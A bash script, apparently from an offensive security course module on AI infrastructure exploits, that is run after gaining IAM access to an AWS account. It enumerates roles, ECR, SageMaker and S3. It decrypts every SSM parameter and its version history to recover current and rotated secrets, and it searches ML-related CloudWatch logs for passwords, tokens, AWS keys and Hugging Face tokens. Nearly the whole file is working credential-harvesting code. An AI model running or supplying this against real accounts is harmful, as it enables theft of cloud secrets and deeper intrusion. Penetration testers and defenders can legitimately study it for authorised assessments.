#!/usr/bin/env bash
"""
Script: aws_ml_enum.sh
Module: 09 — AI Infrastructure and Deployment Exploits
Purpose: Enumerate ML-related AWS resources and hunt for credentials after gaining IAM access
Usage: bash aws_ml_enum.sh [profile]
Target: AWS account with ML workloads (SageMaker, ECR, SSM, CloudWatch)
"""

PROFILE=${1:-default}
REGION=$(aws configure get region --profile "$PROFILE" 2>/dev/null || echo "us-east-1")

echo "=== AWS ML Credential Hunter ==="
echo "Profile: $PROFILE | Region: $REGION"
echo ""

# Who are we?
echo "[*] Identity check"
aws sts get-caller-identity --profile "$PROFILE" 2>/dev/null
echo ""

# IAM — list roles to find chain targets
echo "[*] IAM Roles (look for DataScientist, MLOps, SageMaker)"
aws iam list-roles --profile "$PROFILE" \
    --query 'Roles[*].[RoleName,Arn]' \
    --output table 2>/dev/null
echo ""

# SSM Parameter Store — secrets
echo "[*] SSM Parameters"
aws ssm describe-parameters --profile "$PROFILE" \
    --query 'Parameters[*].[Name,Type,LastModifiedDate]' \
    --output table 2>/dev/null

echo ""
echo "[*] Attempting to read SSM params (with decryption)"
for param in $(aws ssm describe-parameters --profile "$PROFILE" \
    --query 'Parameters[*].Name' --output text 2>/dev/null); do
    echo "  --- $param ---"
    aws ssm get-parameter --name "$param" --with-decryption \
        --profile "$PROFILE" --query 'Parameter.Value' --output text 2>/dev/null
    # ALWAYS check version history — rotated passwords live here
    echo "  [history]"
    aws ssm get-parameter-history --name "$param" --with-decryption \
        --profile "$PROFILE" \
        --query 'Parameters[*].[Version,Value]' \
        --output table 2>/dev/null
done
echo ""

# ECR — find repos and list images
echo "[*] ECR Repositories"
aws ecr describe-repositories --profile "$PROFILE" \
    --query 'repositories[*].[repositoryName,repositoryUri]' \
    --output table 2>/dev/null
echo ""

# CloudWatch — log groups that might contain secrets
echo "[*] CloudWatch Log Groups (filter for ml/sagemaker/lambda)"
aws logs describe-log-groups --profile "$PROFILE" \
    --query 'logGroups[*].logGroupName' \
    --output text 2>/dev/null | tr '\t' '\n' | grep -iE "ml|sagemaker|lambda|train|infer"
echo ""

echo "[*] Scanning CloudWatch logs for credential patterns"
for group in $(aws logs describe-log-groups --profile "$PROFILE" \
    --query 'logGroups[*].logGroupName' --output text 2>/dev/null | tr '\t' '\n' | \
    grep -iE "ml|sagemaker|lambda|train|infer"); do
    echo "  Scanning: $group"
    for pattern in "password" "token" "secret" "key" "AKIA" "hf_"; do
        result=$(aws logs filter-log-events \
            --log-group-name "$group" \
            --filter-pattern "$pattern" \
            --limit 5 \
            --profile "$PROFILE" \
            --query 'events[*].message' \
            --output text 2>/dev/null)
        [ -n "$result" ] && echo "    [HIT: $pattern] $result"
    done
done
echo ""

# SageMaker — model packages (metadata may contain credentials)
echo "[*] SageMaker Model Packages"
aws sagemaker list-model-packages --profile "$PROFILE" \
    --query 'ModelPackageSummaryList[*].[ModelPackageName,ModelPackageStatus]' \
    --output table 2>/dev/null
echo ""

# S3 — buckets (SageMakerFullAccess = s3:* account-wide)
echo "[*] S3 Buckets"
aws s3 ls --profile "$PROFILE" 2>/dev/null
echo ""

echo "=== Done ==="
